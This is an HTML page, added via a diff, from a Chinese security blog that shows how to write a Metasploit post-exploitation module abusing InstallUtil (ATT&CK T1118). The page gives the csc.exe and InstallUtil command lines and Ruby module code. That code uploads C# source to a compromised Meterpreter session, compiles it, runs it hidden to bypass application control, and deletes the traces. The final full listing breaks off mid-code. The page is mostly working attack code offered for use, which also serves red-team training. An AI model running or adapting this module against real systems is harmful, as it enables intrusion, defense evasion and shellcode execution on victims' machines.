@@ -1,0 +1,1114 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="Metasploit,">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta name="keywords" content="Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit后渗透模块编写ATT&amp;CK-T1118">
+<meta property="og:url" content="www.ggsec.cn/metasploit后渗透模块编写ATT&CK-T1118.html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-tou.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-4.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-5.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-6.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-8.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-7.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-1.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-2.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-xj.png">
+<meta property="og:updated_time" content="2020-08-19T13:08:45.477Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit后渗透模块编写ATT&amp;CK-T1118">
+<meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-tou.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> Metasploit后渗透模块编写ATT&CK-T1118 | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              Metasploit后渗透模块编写ATT&CK-T1118
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2020-08-19T20:47:34+08:00" content="2020-08-19">
+            2020-08-19
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/Metasploit/" itemprop="url" rel="index">
+                  <span itemprop="name">Metasploit</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/metasploit后渗透模块编写ATT&CK-T1118.html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="metasploit后渗透模块编写ATT&CK-T1118.html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/metasploit后渗透模块编写ATT&CK-T1118.html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-tou.jpg" alt="4"><a id="more"></a></p>
+<h2 id="1-T1118"><a href="#1-T1118" class="headerlink" title="1.T1118"></a>1.T1118</h2><p>攻击者可以使用InstallUtil通过受信任的Windows实用工具代理代码执行。InstallUtil是一个命令行实用程序，通过执行.NET二进制文件中指定的特定安装程序组件，允许安装和卸载资源。（引用：MSDN InstallUtil）InstallUtil由Microsoft数字签名，位于Windows系统上的.NET目录中：<code>C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe`</code>C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe`</p>
+<p>通过在二进制文件中使用执行用属性装饰的类的属性，InstallUtil也可以用于绕过应用程序控制<code>[System.ComponentModel.RunInstaller(true)]</code></p>
+<h2 id="2-T1118-POC"><a href="#2-T1118-POC" class="headerlink" title="2.T1118-POC"></a>2.T1118-POC</h2><p> <strong>InstallUtil HelpText方法调用</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-4.png" alt="4"></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一步:</span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\<span class="title">csc.exe</span> /<span class="title">target:library</span> <span class="title">T1118.cs</span></span></span><br><span class="line"><span class="function">第二步:</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\<span class="title">InstallUtil.exe</span> /<span class="title">U</span> /<span class="title">logfile</span>= /<span class="title">logtoconsole</span>=<span class="title">false</span> <span class="title">T1118.dll</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HelpText</span> 调用:</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">Microsoft.NET</span>\<span class="title">Framework</span>\<span class="title">v4</span>.0.30319\<span class="title">InstallUtil.exe</span> /? <span class="title">T1118.dll</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-5.png" alt="5"></p>
+<h2 id="3-开始编写模块"><a href="#3-开始编写模块" class="headerlink" title="3.开始编写模块"></a>3.开始编写模块</h2><p><strong>思路流程：</strong></p>
+<p>由于t1118属于后渗透阶段，我们为其在获取session会话的时候进行以下操作</p>
+<p><strong>1.上传源代码。</strong></p>
+<p><strong>2.csc编译dll</strong></p>
+<p><strong>3.InstallUtil.exe调用加载dll</strong> </p>
+<p>需要定义设置的参数：</p>
+<p><strong>1.本地C#源码</strong></p>
+<p><strong>2.上传windows的路径</strong></p>
+<p><strong>3.dotnet的版本</strong></p>
+<p>我们在<strong>/usr/share/metasploit-framework/modules/post/windows/</strong>和/usr/share/metasploit-framework/data/文件夹中新建一个文件夹本文命名为<strong>secist</strong>，在这个文件夹中用于存放关于att&amp;ck相关的攻击模块。</p>
+<p><strong>然后新建一个ruby文件，为其命名为t1118.rb。</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-6.png" alt="6"></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-8.png" alt="6"></p>
+<h3 id="3-1-初始化模块"><a href="#3-1-初始化模块" class="headerlink" title="3.1 初始化模块"></a>3.1 初始化模块</h3><p>参考官方编写模块 <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module</a> </p>
+<p><strong>定义初始化info信息</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-7.png" alt="7"></p>
+<p>设置参数</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OptString.new( <span class="string">'RFILE'</span>, [<span class="literal">false</span>, <span class="string">'上传到windows路径'</span>,<span class="string">'C:\\windows\\temp\\t1118.tmp'</span> ]),</span><br><span class="line">OptString.new(<span class="string">'LFILE'</span>, [ <span class="literal">true</span>, <span class="string">'本地t1118.cs路径'</span>, <span class="symbol">:</span><span class="symbol">:File</span>.join(Msf::Config.install_root, <span class="string">"data"</span>, <span class="string">"secist"</span>, <span class="string">"t1118"</span>, <span class="string">"t1118.cs"</span>) ]),</span><br><span class="line">OptBool.new(<span class="string">'CLEANUP_FILE'</span>, [ <span class="literal">true</span>, <span class="string">"清理文件"</span>, <span class="literal">true</span>]),</span><br><span class="line">OptString.new(<span class="string">'DOTNET_VERSION'</span>, [<span class="literal">true</span>, <span class="string">'DotNet Version'</span>,<span class="string">'v4.0.30319'</span> ]),</span><br></pre></td></tr></table></figure>
+<p>定义使用run命令 执行的内容。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span></span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">"meterpreter"</span></span><br><span class="line">        print_good(<span class="string">"模块T1118执行成功"</span>)</span><br><span class="line">    <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">        print_status(<span class="string">"Unable to execute: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">        print_error(<span class="string">"模块T1118执行失败"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-2-定义本地文件和上传文件"><a href="#3-2-定义本地文件和上传文件" class="headerlink" title="3.2  定义本地文件和上传文件"></a>3.2  定义本地文件和上传文件</h3><p><strong>定义remote_file和local_file 对 datastore[‘RFILE’]和 datastore[‘LFILE’]取值</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remote_file</span></span></span><br><span class="line">    <span class="keyword">if</span> datastore[<span class="string">'RFILE'</span>].blank?</span><br><span class="line">      remote_name = File.basename(datastore[<span class="string">'LFILE'</span>])</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      remote_name = datastore[<span class="string">'RFILE'</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    remote_name</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">local_file</span></span></span><br><span class="line">      datastore[<span class="string">'LFILE'</span>]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-3-删除上传的源代码"><a href="#3-3-删除上传的源代码" class="headerlink" title="3.3 删除上传的源代码"></a>3.3 删除上传的源代码</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean_file</span></span></span><br><span class="line">      print_status(<span class="string">"Removing files..."</span>)</span><br><span class="line">      register_file_for_cleanup(datastore[<span class="string">'RFILE'</span>])</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-3定义cmd的命令"><a href="#3-3定义cmd的命令" class="headerlink" title="3.3定义cmd的命令"></a>3.3定义cmd的命令</h3><p>使用run_cmd 运行命令</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(user_cmd,io=<span class="literal">true</span>)</span></span></span><br><span class="line">    cmd = <span class="string">"cmd /c <span class="subst">#&#123;user_cmd&#125;</span>"</span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">      print_status(<span class="string">"Executing '<span class="subst">#&#123;cmd&#125;</span>' on <span class="subst">#&#123;session.inspect&#125;</span>"</span>)</span><br><span class="line">      <span class="keyword">if</span> io</span><br><span class="line">        res = cmd_exec(cmd)</span><br><span class="line">        <span class="keyword">if</span> res</span><br><span class="line">          print_warning(res)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        res = session.sys.process.execute(cmd, <span class="literal">nil</span>, &#123;<span class="string">'Hidden'</span> =&gt; <span class="literal">true</span>&#125;)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">      print_error(<span class="string">"Unable to execute: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-4上传文件和命令执行"><a href="#3-4上传文件和命令执行" class="headerlink" title="3.4上传文件和命令执行"></a>3.4上传文件和命令执行</h3><p>该步骤为以下内容</p>
+<p>1.上传本地的<strong>/usr/share/metasploit-framework/data/secist/t1118/t1118.cs</strong>文件到<strong>C:\windows\temp\t1118.tmp</strong></p>
+<p><strong>2.使用csc.exe 对t1118.tmp 进行编译</strong></p>
+<p><strong>3.使用InstallUtil对编译后的dll进行调用</strong></p>
+<p><strong>4.删除源文件</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span></span></span><br><span class="line">        <span class="keyword">begin</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">"meterpreter"</span></span><br><span class="line">            rfile = remote_file()</span><br><span class="line">            lfile = local_file()</span><br><span class="line">            dotnet_version = datastore[<span class="string">'DOTNET_VERSION'</span>]</span><br><span class="line">            base = <span class="string">'C:\Windows\Microsoft.NET\Framework'</span></span><br><span class="line">          </span><br><span class="line">            csc = base + <span class="string">'\\'</span> + dotnet_version + <span class="string">'\\'</span> + <span class="string">'csc.exe'</span></span><br><span class="line">            installutil = base + <span class="string">'\\'</span> + dotnet_version + <span class="string">'\\'</span> + <span class="string">'installutil.exe'</span></span><br><span class="line"></span><br><span class="line">            upload_file(rfile, lfile)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;csc&#125;</span> /out:C:\\windows\\temp\\t1118.dll <span class="subst">#&#123;rfile&#125;</span>)</span></span><br><span class="line">            print_status(<span class="string">"Compiling..."</span>)</span><br><span class="line">            run_cmd(cmd)</span><br><span class="line"><span class="comment">#C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library T1118.cs</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;installutil&#125;</span> /logfile= /LogToConsole=false /U C:\\windows\\temp\\t1118.dll")</span></span><br><span class="line">        <span class="comment">#C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U /logfile= /logtoconsole=false T1118.dll    </span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            print_status(<span class="string">"Executing InstallUtil..."</span>)</span><br><span class="line">            run_cmd(cmd,<span class="literal">false</span>)</span><br><span class="line">            print_good(<span class="string">"模块T1118执行成功"</span>)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            clean_file()</span><br><span class="line">            print_good(<span class="string">"清理缓存成功"</span>)</span><br><span class="line">        <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">            print_status(<span class="string">"Unable to execute: <span class="subst">#&#123;e.message&#125;</span>"</span>)</span><br><span class="line">            print_error(<span class="string">"模块T1118执行失败"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p><strong>t1118整体加载模块初始设置</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-1.png" alt="1"></p>
+<p><strong>poc 运行后</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-2.png" alt="2"></p>
+<p><strong>poc 填入shellcode 运行后</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-.png" alt="xj"></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20200819-xj.png" alt="xj"></p>
+<h2 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4.完整代码"></a>4.完整代码</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Post</span></span><br><span class="line">    <span class="keyword">include</span> Msf::Post::File</span><br><span class="line">    <span class="keyword">include</span> Exploit::FileDropper</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info=&#123;&#125;)</span></span></span><br><span class="line">      <span class="keyword">super</span>(update_info(info,</span><br><span class="line">                        <span class="string">'Name'</span>          =&gt; <span class="string">'InstallUtil (T1118) Windows'</span>,</span><br><span class="line">                        <span class="string">'Description'</span>   =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">                        ATT&amp;CK 模块编写 T1118  &#125;</span>,</span><br><span class="line">                        <span class="string">'License'</span>       =&gt; MSF_LICENSE,</span><br><span class="line">                        <span class="string">'Author'</span>        =&gt; [ <span class="string">'secist-demon'</span> ],</span><br><span class="line">                        <span class="string">'References'</span>    =&gt; [ 